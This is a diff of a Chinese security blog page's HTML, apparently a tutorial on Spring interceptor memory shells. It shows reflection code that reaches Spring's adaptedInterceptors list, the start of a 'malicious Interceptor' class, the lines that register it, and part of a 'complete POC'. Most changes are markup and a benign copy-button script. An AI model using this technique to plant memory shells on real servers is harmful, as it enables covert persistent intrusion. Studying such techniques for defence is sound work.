-</span></span></span><span class="line"><span class="cl"><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">context</span><span class="p">.</span><span class="na">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">context</span><span class="p">.</span><span class="na">WebApplicationContext</span><span class="p">)</span><span class="w"> </span><span class="p">((</span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">LinkedHashSet</span><span class="p">)</span><span class="n">filed</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">)).</span><span class="na">iterator</span><span class="p">().</span><span class="na">next</span><span class="p">();</span><span class="w">
-</span></span></span></code></pre></div><h4 id="232-获取adaptedinterceptors属性值">2.3.2 获取adaptedInterceptors属性值<a hidden class="anchor" aria-hidden="true" href="#232-获取adaptedinterceptors属性值">#</a></h4>
+</span></span></span><span class="line"><span class="cl"><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">context</span><span class="p">.</span><span class="na">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">context</span><span class="p">.</span><span class="na">WebApplicationContext</span><span class="p">)</span><span class="w"> </span><span class="p">((</span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">LinkedHashSet</span><span class="p">)</span><span class="n">filed</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">)).</span><span class="na">iterator</span><span class="p">().</span><span class="na">next</span><span class="p">();</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><h4 id="232-获取adaptedinterceptors属性值">2.3.2 获取adaptedInterceptors属性值<a hidden class="anchor" aria-hidden="true" href="#232-获取adaptedinterceptors属性值">#</a></h4>
 <p>获得 <code>ApplicationContext</code> 实例后，还需要知道 <code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code> 类实例的 bean name 叫什么。</p>
 <p>我们可以通过<code>ApplicationContext</code>上下文来获取<code>AbstractHandlerMapping</code>，进而反射获取<code>adaptedInterceptors</code>属性值</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">handler</span><span class="p">.</span><span class="na">AbstractHandlerMapping</span><span class="w"> </span><span class="n">abstractHandlerMapping</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">handler</span><span class="p">.</span><span class="na">AbstractHandlerMapping</span><span class="p">)</span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="s">&#34;requestMappingHandlerMapping&#34;</span><span class="p">);</span><span class="w">
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
+</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">handler</span><span class="p">.</span><span class="na">AbstractHandlerMapping</span><span class="w"> </span><span class="n">abstractHandlerMapping</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">handler</span><span class="p">.</span><span class="na">AbstractHandlerMapping</span><span class="p">)</span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="s">&#34;requestMappingHandlerMapping&#34;</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">reflect</span><span class="p">.</span><span class="na">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">handler</span><span class="p">.</span><span class="na">AbstractHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;adaptedInterceptors&#34;</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">adaptedInterceptors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="p">)</span><span class="n">field</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">abstractHandlerMapping</span><span class="p">);</span><span class="w">
-</span></span></span></code></pre></div><h4 id="233-恶意-interceptor">2.3.3 恶意 Interceptor<a hidden class="anchor" aria-hidden="true" href="#233-恶意-interceptor">#</a></h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.shell.interceptor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">adaptedInterceptors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="p">)</span><span class="n">field</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">abstractHandlerMapping</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><h4 id="233-恶意-interceptor">2.3.3 恶意 Interceptor<a hidden class="anchor" aria-hidden="true" href="#233-恶意-interceptor">#</a></h4>
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
+</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
+</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
+</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
+</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
+</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
+</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
+</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
+</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
+</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
+</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
+</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
+</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
+</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
+</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
+</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
+</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
+</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
+</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
+</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
+</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
+</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
+</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
+</span><span class="lnt" id="26"><a class="lnlinks" href="#26">26</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.shell.interceptor</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> 
 </span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.HandlerInterceptor</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> 
@@ -695,14 +1462,116 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><h4 id="234-动态注册interceptor">2.3.4 动态注册Interceptor<a hidden class="anchor" aria-hidden="true" href="#234-动态注册interceptor">#</a></h4>
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><h4 id="234-动态注册interceptor">2.3.4 动态注册Interceptor<a hidden class="anchor" aria-hidden="true" href="#234-动态注册interceptor">#</a></h4>
 <p>我们知道Spring是通过遍历adaptedInterceptors属性值来执行Interceptor的，因此最后我们只需要将恶意Interceptor加入到 <code>adaptedInterceptors</code> 属性值中就可以了。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//将恶意Interceptor添加入adaptedInterceptors</span><span class="w">
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//将恶意Interceptor添加入adaptedInterceptors</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">ShellInterceptor</span><span class="w"> </span><span class="n">shell_interceptor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ShellInterceptor</span><span class="p">();</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="n">adaptedInterceptors</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">shell_interceptor</span><span class="p">);</span><span class="w">
-</span></span></span></code></pre></div><h4 id="235-完整-poc">2.3.5 完整 POC<a hidden class="anchor" aria-hidden="true" href="#235-完整-poc">#</a></h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.src.springmem.demos.controller</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">adaptedInterceptors</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">shell_interceptor</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><h4 id="235-完整-poc">2.3.5 完整 POC<a hidden class="anchor" aria-hidden="true" href="#235-完整-poc">#</a></h4>
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
+</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
+</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
+</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
+</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
+</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
+</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
+</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
+</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
+</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
+</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
+</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
+</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
+</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
+</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
+</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
+</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
+</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
+</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
+</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
+</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
+</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
+</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
+</span><span class="lnt" id="26"><a class="lnlinks" href="#26">26</a>
+</span><span class="lnt" id="27"><a class="lnlinks" href="#27">27</a>
+</span><span class="lnt" id="28"><a class="lnlinks" href="#28">28</a>
+</span><span class="lnt" id="29"><a class="lnlinks" href="#29">29</a>
+</span><span class="lnt" id="30"><a class="lnlinks" href="#30">30</a>
+</span><span class="lnt" id="31"><a class="lnlinks" href="#31">31</a>
+</span><span class="lnt" id="32"><a class="lnlinks" href="#32">32</a>
+</span><span class="lnt" id="33"><a class="lnlinks" href="#33">33</a>
+</span><span class="lnt" id="34"><a class="lnlinks" href="#34">34</a>
+</span><span class="lnt" id="35"><a class="lnlinks" href="#35">35</a>
+</span><span class="lnt" id="36"><a class="lnlinks" href="#36">36</a>
+</span><span class="lnt" id="37"><a class="lnlinks" href="#37">37</a>
+</span><span class="lnt" id="38"><a class="lnlinks" href="#38">38</a>
+</span><span class="lnt" id="39"><a class="lnlinks" href="#39">39</a>
+</span><span class="lnt" id="40"><a class="lnlinks" href="#40">40</a>
+</span><span class="lnt" id="41"><a class="lnlinks" href="#41">41</a>
+</span><span class="lnt" id="42"><a class="lnlinks" href="#42">42</a>
+</span><span class="lnt" id="43"><a class="lnlinks" href="#43">43</a>
+</span><span class="lnt" id="44"><a class="lnlinks" href="#44">44</a>
+</span><span class="lnt" id="45"><a class="lnlinks" href="#45">45</a>
+</span><span class="lnt" id="46"><a class="lnlinks" href="#46">46</a>
+</span><span class="lnt" id="47"><a class="lnlinks" href="#47">47</a>
+</span><span class="lnt" id="48"><a class="lnlinks" href="#48">48</a>
+</span><span class="lnt" id="49"><a class="lnlinks" href="#49">49</a>
+</span><span class="lnt" id="50"><a class="lnlinks" href="#50">50</a>
+</span><span class="lnt" id="51"><a class="lnlinks" href="#51">51</a>
+</span><span class="lnt" id="52"><a class="lnlinks" href="#52">52</a>
+</span><span class="lnt" id="53"><a class="lnlinks" href="#53">53</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.src.springmem.demos.controller</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.stereotype.Controller</span><span class="p">;</span><span class="w">
@@ -754,8 +1623,10 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518658.png" style="max-width: 100%; height: auto;"></p>
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518658.png" style="max-width: 100%; height: auto;"></p>
 <p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518094.png" style="max-width: 100%; height: auto;"></p>
 <p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521076.png" style="max-width: 100%; height: auto;"></p>
 <h1 id="参考">参考：<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h1>
@@ -831,7 +1702,40 @@
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
         <path d="M12 6H0l6-6z" />
     </svg>
-</a>
+</a><script>
+document.addEventListener('DOMContentLoaded', function() {
+    
+    document.querySelectorAll('.code-header').forEach(header => {
+        header.addEventListener('click', (e) => {
+            
+            if (e.target.closest('.copy-btn')) return;
+
+            const container = header.parentElement;
+            const isExpanded = container.getAttribute('data-expanded') === 'true';
+            container.setAttribute('data-expanded', !isExpanded);
+        });
+    });
+
+    
+    document.querySelectorAll('.copy-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const container = btn.closest('.code-block-container');
+            const code = container.querySelector('code').innerText;
+            
+            navigator.clipboard.writeText(code).then(() => {
+                
+                const originalHTML = btn.innerHTML;
+                btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#50fa7b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
+                setTimeout(() => {
+                    btn.innerHTML = originalHTML;
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy!', err);
+            });
+        });
+    });
+});
+</script>
 
 <script>
     let menu = document.getElementById('menu');
